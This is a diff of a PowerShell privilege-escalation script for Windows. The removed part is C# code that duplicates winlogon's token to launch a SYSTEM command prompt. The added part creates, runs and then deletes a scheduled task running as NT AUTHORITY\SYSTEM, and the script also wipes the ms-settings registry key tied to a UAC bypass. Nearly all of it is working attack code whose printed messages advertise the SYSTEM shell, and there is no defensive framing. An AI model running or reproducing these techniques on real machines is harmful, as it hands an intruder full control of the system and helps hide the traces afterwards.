@@ -20,97 +20,65 @@ if (-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administra
 Write-Host "[+] Running as Administrator" -ForegroundColor Green
 Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
 
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-using System.Diagnostics;
+Write-Host "[*] Method: Scheduled Task with Interactive flag..." -ForegroundColor Cyan
 
-public class SystemSpawn {
-    [DllImport("advapi32.dll", SetLastError = true)]
-    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
-    
-    [DllImport("advapi32.dll", SetLastError = true)]
-    static extern bool DuplicateTokenEx(IntPtr hToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
-    
-    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-    static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpAppName, string lpCmdLine, uint dwCreationFlags, IntPtr lpEnv, string lpCurDir, ref STARTUPINFO lpSi, out PROCESS_INFORMATION lpPi);
-    
-    [DllImport("kernel32.dll", SetLastError = true)]
-    static extern bool CloseHandle(IntPtr hObject);
-    
-    [DllImport("advapi32.dll", SetLastError = true)]
-    static extern bool LookupPrivilegeValue(string lpSysName, string lpName, out LUID lpLuid);
-    
-    [DllImport("advapi32.dll", SetLastError = true)]
-    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
-    
-    [DllImport("ntdll.dll", SetLastError = true)]
-    static extern int NtSetInformationToken(IntPtr TokenHandle, int TokenInformationClass, ref uint TokenInformation, int TokenInformationLength);
-
-    [StructLayout(LayoutKind.Sequential)] public struct LUID { public uint LowPart; public int HighPart; }
-    [StructLayout(LayoutKind.Sequential)] public struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
-    [StructLayout(LayoutKind.Sequential)] public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privileges; }
-    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-    public struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags; public short wShowWindow, cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError; }
-    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }
-
-    static void EnablePrivilege(string priv) {
-        IntPtr hToken;
-        OpenProcessToken(Process.GetCurrentProcess().Handle, 0x0020 | 0x0008, out hToken);
-        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
-        tp.PrivilegeCount = 1;
-        tp.Privileges.Attributes = 0x00000002;
-        LookupPrivilegeValue(null, priv, out tp.Privileges.Luid);
-        AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
-        CloseHandle(hToken);
-    }
-
-    public static int Spawn() {
-        EnablePrivilege("SeDebugPrivilege");
-        EnablePrivilege("SeImpersonatePrivilege");
-        EnablePrivilege("SeAssignPrimaryTokenPrivilege");
-        
-        Process[] procs = Process.GetProcessesByName("winlogon");
-        if (procs.Length == 0) return -1;
-        
-        IntPtr hProc = procs[0].Handle;
-        IntPtr hToken;
-        if (!OpenProcessToken(hProc, 0x02000000, out hToken)) return Marshal.GetLastWin32Error();
-        
-        IntPtr hDup;
-        if (!DuplicateTokenEx(hToken, 0x02000000, IntPtr.Zero, 2, 1, out hDup)) { CloseHandle(hToken); return Marshal.GetLastWin32Error(); }
-        
-        uint sessionId = (uint)Process.GetCurrentProcess().SessionId;
-        NtSetInformationToken(hDup, 12, ref sessionId, sizeof(uint));
-        
-        STARTUPINFO si = new STARTUPINFO();
-        si.cb = Marshal.SizeOf(si);
-        si.lpDesktop = "WinSta0\\Default";
-        PROCESS_INFORMATION pi;
-        
-        if (!CreateProcessWithTokenW(hDup, 0x00000002, "cmd.exe", "cmd.exe /k title SYSTEM && color 0a && whoami", 0x00000010, IntPtr.Zero, null, ref si, out pi)) {
-            CloseHandle(hToken); CloseHandle(hDup);
-            return Marshal.GetLastWin32Error();
-        }
-        
-        CloseHandle(hToken); CloseHandle(hDup);
-        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-        return 0;
-    }
-}
+$TaskName = "LoSys_$((Get-Random -Maximum 9999))"
+$XmlTask = @"
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers>
+    <TimeTrigger>
+      <StartBoundary>1999-01-01T00:00:00</StartBoundary>
+      <Enabled>false</Enabled>
+    </TimeTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>false</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>false</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>cmd.exe</Command>
+      <Arguments>/k "title SYSTEM SHELL &amp; color 0a &amp; whoami &amp; echo. &amp; echo You are NT AUTHORITY\SYSTEM"</Arguments>
+    </Exec>
+  </Actions>
+</Task>
 "@
 
-Write-Host "[*] Enabling privileges and spawning SYSTEM shell..." -ForegroundColor Cyan
-$result = [SystemSpawn]::Spawn()
+$TempXml = "$env:TEMP\$TaskName.xml"
+Set-Content -Path $TempXml -Value $XmlTask -Encoding Unicode
 
-if ($result -eq 0) {
-    Write-Host "[+] SYSTEM CMD spawned!" -ForegroundColor Green
-    Write-Host "[!] Green CMD window should be on your taskbar!" -ForegroundColor Magenta
-} elseif ($result -eq -1) {
-    Write-Host "[-] winlogon.exe not found" -ForegroundColor Red
-} else {
-    Write-Host "[-] Failed with error: $result" -ForegroundColor Red
-}
+schtasks /Create /TN $TaskName /XML $TempXml /F 2>&1 | Out-Null
+Remove-Item $TempXml -Force
+
+Write-Host "[+] Task created: $TaskName" -ForegroundColor Green
+Write-Host "[*] Launching interactive SYSTEM shell..." -ForegroundColor Cyan
+
+schtasks /Run /I /TN $TaskName 2>&1 | Out-Null
+
+Start-Sleep -Seconds 2
+
+schtasks /Delete /TN $TaskName /F 2>&1 | Out-Null
+Write-Host "[+] Cleanup done" -ForegroundColor Green
+
+Write-Host "`n[!] Look for the GREEN CMD window!" -ForegroundColor Magenta
+Write-Host "    It runs as NT AUTHORITY\SYSTEM" -ForegroundColor White
 
 Write-Host "`nPress any key to exit..." -ForegroundColor Cyan
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
